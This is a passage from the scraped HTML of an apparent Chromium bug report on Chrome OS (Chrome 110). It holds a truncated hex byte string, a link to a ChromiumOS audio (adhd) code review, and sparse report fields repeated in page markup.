a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<!----></span><br><br><br>bitset:<span class="line"><!---->bitset:<!----></span><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" href="https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723"><!---->https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<!----></a><br><br>Problem Description:<b class="line"><!---->Problem Description:<!----></b><br>above all<span class="line"><!---->above all<!----></span><br><br>Additional Comments:<b class="line"><!---->Additional Comments:<!----></b><br><br><br>Chrome version: <b class="line"><!---->Chrome version: <!----></b>110.0.0.0 <span class="line"><!---->110.0.0.0 <!----></span>Channel: <b class="line"><!---->Channel: <!----></b>Not sure<span class="line"><!---->Not sure<!----></span><br><br>OS:<b class="line"><!---->OS:<!----></b>Chrome OS<span class="line"><!---->Chrome OS<!----></span><mr-comment-content></mr-comment-content>
